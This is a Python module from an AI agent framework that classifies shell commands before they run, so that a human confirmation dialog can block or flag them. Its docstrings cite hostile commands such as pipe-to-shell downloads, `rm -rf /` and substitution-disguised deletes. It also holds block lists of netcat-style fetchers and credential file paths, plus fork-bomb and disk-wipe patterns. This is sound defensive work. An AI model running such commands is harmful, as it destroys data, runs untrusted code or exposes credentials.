# SPDX-FileCopyrightText: 2026 Veyllo GmbH
# SPDX-License-Identifier: AGPL-3.0-or-later
# Additional permissions and terms under AGPL Section 7: see LICENSING.md
"""Offline classification of a shell command, before anything runs.

Replaces a substring blocklist that was wrong in both directions: measured on
the old implementation, `curl http://x | bash`, `wget http://x -O- | sh`,
`rm  -rf  /` and `$(echo rm) -rf /` all passed, while `rm -rf /tmp/scratch`
was refused because the string contains `rm -rf /`.

The classifier tokenizes quote-aware, splits on the shell's own separators,
descends into command substitutions, strips transparent wrappers, and then
judges the executable and its arguments. The verdict is DATA (categories +
segments), so the confirmation dialog can show WHY a command is flagged
instead of only that it is.

Two profiles, because the two lanes have different confinement:
- ``host``   - vaf/tools/host_bash.py runs unsandboxed on the machine, with
  the whole environment. Its only other control is the human approval, so the
  catastrophic set is refused outright.
- ``jailed`` - vaf/tools/bash.py runs under bubblewrap (--clearenv,
  --unshare-net, repo and secrets unmounted) or a --network none container.
  Network fetches cannot reach anything, and wiping the throwaway workspace is
  ordinary work, so only what can hurt the machine or the jail root is refused.

This module lives in vaf/core, not next to the tools, because the confirmation
gate (vaf/core/tool_dispatch.py) renders the verdict: vaf/core importing
vaf/tools would point the dependency the wrong way round.

Stdlib-only on purpose - it is imported on the dispatch hot path.
"""
from __future__ import annotations

import re
import shlex
from dataclasses import dataclass, field
from typing import List

# Executables that read a script from stdin: the sink half of "fetch | shell".
_SHELL_SINKS = frozenset({
    "sh", "bash", "zsh", "dash", "ksh", "csh", "fish", "python", "python2",
    "python3", "perl", "ruby", "node", "php", "powershell", "pwsh",
})
# Executables that pull bytes off the network: the source half.
_NETWORK_FETCHERS = frozenset({
    "curl", "wget", "fetch", "aria2c", "http", "httpie", "nc", "ncat", "netcat",
})
# Wrappers that only decorate another command; the real executable follows.
_TRANSPARENT_WRAPPERS = frozenset({
    "sudo", "doas", "nohup", "time", "env", "command", "exec", "stdbuf",
    "nice", "ionice", "setsid", "timeout", "xargs", "eval", "builtin",
})
# Writes straight to a block device or formats one.
_DEVICE_WRITERS = frozenset({"dd", "mkfs", "fdisk", "parted", "sfdisk", "shred"})
# Reading these is a credential grab worth naming in the dialog.
_CREDENTIAL_PATHS = ("/etc/shadow", "id_rsa", "id_ed25519", ".aws/credentials",
                     ".ssh/", ".netrc", "credentials.json")

# Paths whose recursive removal is never ordinary work.
_PROTECTED_ROOTS = ("/", "/*", "/bin", "/boot", "/dev", "/etc", "/home", "/lib",
                    "/lib64", "/opt", "/proc", "/root", "/sbin", "/srv", "/sys",
                    "/usr", "/var", "~", "~/", "$HOME", "${HOME}", "c:\\", "c:/")

_FORK_BOMB_RE = re.compile(r":\s*\(\s*\)\s*\{.*\|\s*:\s*&.*\}\s*;\s*:", re.DOTALL)
_DEVICE_TARGET_RE = re.compile(r"of=/dev/(sd|nvme|hd|vd|mmcblk|disk)", re.IGNORECASE)
_REDIRECT_DEVICE_RE = re.compile(r">\s*/dev/(sd|nvme|hd|vd|mmcblk|disk)", re.IGNORECASE)
# A substitution standing where the executable belongs: start of the command,
# or right after a separator.
_SUBST_IN_CMD_POS_RE = re.compile(r"(?:^|[;&|\n]|&&|\|\|)\s*(?:\$\(|`)")

CATEGORY_REASONS = {
    "pipe_to_shell": "downloads code from the network and pipes it into a shell",
    "device_write": "writes directly to a block device or formats a filesystem",
    "fork_bomb": "is a fork bomb",
    "destructive_removal": "recursively deletes a protected system or home path",
    "network_fetch": "fetches data from the network",
    "credential_read": "reads credential material",
    "history_rewrite": "discards uncommitted work or rewrites history",
    "opaque_command": "builds the executable from a command substitution, so the "
                      "text being approved is not the text that will run",
}


@dataclass
class CommandVerdict:
    """What the classifier found. Data, so a dialog can explain it."""
    blocked: bool = False
    reason: str = ""
    categories: List[str] = field(default_factory=list)
    segments: List[str] = field(default_factory=list)

    @property
    def warning(self) -> str:
        """Human line for categories that are noteworthy but allowed."""
        if self.blocked or not self.categories:
            return ""
        named = [CATEGORY_REASONS[c] for c in self.categories if c in CATEGORY_REASONS]
        return f"Note: this command {', and '.join(named)}." if named else ""


def _split_segments(command: str) -> List[tuple]:
    """Split on shell separators OUTSIDE quotes, descending into $( ), ` ` and ( ).

    Returns (connector, segment) pairs, where the connector says how a segment
    is joined to its predecessor: "pipe" only for a single `|`, everything else
    ("start", ";", "&&", substitution boundaries) breaks the pipeline. That
    distinction carries the whole pipe-to-shell judgement: `curl x | bash` is
    unreviewable, while `curl x > f; python parse.py` is a download followed by
    a separate, visible command (measured false positive of the first version).

    A plain `command.split("|")` would be fooled by `echo "a|b"`, and a regex
    over the whole string never sees what a substitution actually runs.
    """
    segments: List[tuple] = []
    connector = "start"
    buf: List[str] = []
    quote = ""       # active quote character, "" when outside quotes
    depth_stack: List[str] = []   # nesting of $( ), ( ) and ` `
    i = 0
    n = len(command)
    while i < n:
        ch = command[i]
        nxt = command[i + 1] if i + 1 < n else ""
        if quote:
            # Inside single quotes nothing is special; inside double quotes a
            # substitution still runs, so keep descending.
            if ch == "\\" and quote == '"':
                buf.append(ch)
                if nxt:
                    buf.append(nxt)
                    i += 2
                    continue
            if ch == quote:
                quote = ""
            elif quote == '"' and ch == "$" and nxt == "(":
                segments.append((connector, "".join(buf).strip()))
                connector = "sub"
                buf = []
                depth_stack.append(")")
                i += 2
                continue
            else:
                buf.append(ch)
            i += 1
            continue
        if ch in ("'", '"'):
            quote = ch
            i += 1
            continue
        if ch == "\\" and nxt:
            buf.append(nxt)
            i += 2
            continue
        if ch == "$" and nxt == "(":
            segments.append((connector, "".join(buf).strip()))
            connector = "sub"
            buf = []
            depth_stack.append(")")
            i += 2
            continue
        if ch == "`":
            segments.append((connector, "".join(buf).strip()))
            connector = "sub"
            buf = []
            if depth_stack and depth_stack[-1] == "`":
                depth_stack.pop()
            else:
                depth_stack.append("`")
            i += 1
            continue
        if ch == "(":
            segments.append((connector, "".join(buf).strip()))
            connector = "sub"
            buf = []
            depth_stack.append(")")
            i += 1
            continue
        if ch == ")" and depth_stack and depth_stack[-1] == ")":
            segments.append((connector, "".join(buf).strip()))
            connector = "sub"
            buf = []
            depth_stack.pop()
            i += 1
            continue
        if ch in ";\n&|":
            segments.append((connector, "".join(buf).strip()))
            buf = []
            # && and || are one separator, not two - and only a SINGLE | is a
            # pipe; || is sequencing like ; and &&.
            if nxt == ch:
                connector = "seq"
                i += 2
                continue
            connector = "pipe" if ch == "|" else "seq"
            i += 1
            continue
        buf.append(ch)
        i += 1
    segments.append((connector, "".join(buf).strip()))
    return [(c, seg) for c, seg in segments if seg]


def _tokens(segment: str) -> List[str]:
    """shlex tokens, falling back to whitespace split on unbalanced quotes."""
    try:
        return shlex.split(segment, posix=True)
    except ValueError:
        return segment.split()


def _executable(tokens: List[str]) -> str:
    """The real executable: wrappers and VAR=value prefixes are stepped over."""
    for tok in tokens:
        base = tok.rsplit("/", 1)[-1].lower()
        if not base:
            continue
        if "=" in tok and not tok.startswith("-") and tok.split("=", 1)[0].isidentifier():
            continue  # VAR=value prefix
        if base.startswith("-"):
            continue
        if base in _TRANSPARENT_WRAPPERS:
            continue
        return base
    return ""


def _is_protected_target(arg: str) -> bool:
    """True when a recursive delete would hit a system or home root."""
    a = arg.strip().strip("'\"").rstrip("/") or "/"
    a_low = a.lower()
    if a in ("/", "/*", "~", "$HOME", "${HOME}") or a_low in ("c:", "c:\\"):
        return True
    for root in _PROTECTED_ROOTS:
        r = root.rstrip("/")
        if not r or r in ("~", "$HOME", "${HOME}"):
            continue
        # /usr and /usr/* are protected, /usr-local-backup is not.
        if a_low == r.lower() or a_low.startswith(r.lower() + "/") and a_low.count("/") <= 2:
            return True
    if a.startswith("~/") and a.count("/") <= 1:
        return True
    return False


def classify_command(command: str, *, profile: str = "host") -> CommandVerdict:
    """Classify a shell command offline. Never raises, never executes anything.

    profile="host"   - unsandboxed lane: refuse the catastrophic set.
    profile="jailed" - bubblewrap/container lane: refuse only what escapes the
                       jail or hurts the machine.
    """
    verdict = CommandVerdict()
    text = (command or "").strip()
    if not text:
        return verdict

    pairs = _split_segments(text)
    verdict.segments = [seg for _, seg in pairs]
    # `$(echo rm) -rf /` reads as harmless and executes as `rm -rf /`: the
    # substitution supplies the executable, so no reader - human or classifier
    # - can tell from the text what runs.
    opaque = bool(_SUBST_IN_CMD_POS_RE.search(text))
    cats: List[str] = []

    if _FORK_BOMB_RE.search(text.replace(" ", "")) or _FORK_BOMB_RE.search(text):
        cats.append("fork_bomb")
    if opaque:
        cats.append("opaque_command")

    pipeline_fetch = False
    for connector, seg in pairs:
        # Only a pipe continues a pipeline. `curl x > f; python parse.py` is a
        # download followed by a separate, human-visible command - the block is
        # reserved for the unreviewable direct pipe into an interpreter.
        if connector != "pipe":
            pipeline_fetch = False
        toks = _tokens(seg)
        if not toks:
            continue
        exe = _executable(toks)
        low = seg.lower()

        if exe in _NETWORK_FETCHERS:
            pipeline_fetch = True
            if "network_fetch" not in cats:
                cats.append("network_fetch")
        if exe in _SHELL_SINKS and pipeline_fetch and "pipe_to_shell" not in cats:
            cats.append("pipe_to_shell")

        is_device_writer = exe in _DEVICE_WRITERS or exe.startswith("mkfs")
        if is_device_writer or _DEVICE_TARGET_RE.search(low) or _REDIRECT_DEVICE_RE.search(low):
            if exe == "dd" and not _DEVICE_TARGET_RE.search(low):
                pass  # dd on a regular file is ordinary
            elif "device_write" not in cats:
                cats.append("device_write")

        if exe == "rm":
            recursive = any(t.startswith("-") and not t.startswith("--") and "r" in t.lower()
                            for t in toks) or "--recursive" in toks
            targets = [t for t in toks[1:] if not t.startswith("-")]
            if recursive and any(_is_protected_target(t) for t in targets):
                if "destructive_removal" not in cats:
                    cats.append("destructive_removal")

        if any(p.lower() in low for p in _CREDENTIAL_PATHS) and "credential_read" not in cats:
            cats.append("credential_read")

        if exe == "git" and ("reset --hard" in low or "clean -fd" in low or "push --force" in low):
            if "history_rewrite" not in cats:
                cats.append("history_rewrite")

    verdict.categories = cats

    if profile == "jailed":
        # The jail has no network and its workspace is disposable; only what
        # reaches the machine or the jail root is refused.
        blocking = [c for c in cats if c in ("fork_bomb", "device_write",
                                            "destructive_removal", "opaque_command")]
    else:
        blocking = [c for c in cats if c in ("fork_bomb", "device_write",
                                             "destructive_removal", "pipe_to_shell",
                                             "opaque_command")]
    if blocking:
        verdict.blocked = True
        first = blocking[0]
        verdict.reason = f"Command contains a forbidden pattern: it {CATEGORY_REASONS[first]}"
    return verdict


def is_command_safe(command: str, *, profile: str = "host") -> tuple:
    """(is_safe, message) adapter kept for the two shell tools.

    The message is the refusal reason when blocked, else a note for the
    noteworthy-but-allowed categories.
    """
    v = classify_command(command, profile=profile)
    return (not v.blocked), (v.reason if v.blocked else v.warning)
